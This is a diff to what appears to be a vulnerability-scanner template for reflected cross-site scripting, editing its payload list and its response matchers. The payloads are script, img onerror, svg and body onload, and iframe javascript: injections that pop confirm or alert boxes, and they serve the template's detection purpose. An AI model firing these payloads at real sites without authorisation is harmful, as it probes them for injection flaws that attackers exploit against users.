@@ -17,8 +17,9 @@ requests:
        payload: 
              - '"><script>confirm(25)</script>'
              - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
-             - '">/><svg/onload=confirm(25)>'
-             - '"onpointerover%3Dconfirm%2825%29+class%3Dxss+'
+             - '"><svg/onload=confirm(25)>'
+             - '"><body/onload=alert(25)>'
+             - '"><iframe/src=javascript:alert(25)>'
              
     stop-at-first-match: true
     matchers-condition: or
@@ -43,5 +44,10 @@ requests:
 
       - type: word
         words:
-          - '"onpointerover=confirm(25) class=xss'
+          - '<body/onload=alert(25)>'
+        part: body
+
+      - type: word
+        words:
+          - '<iframe/src=javascript:alert(25)>'
         part: body
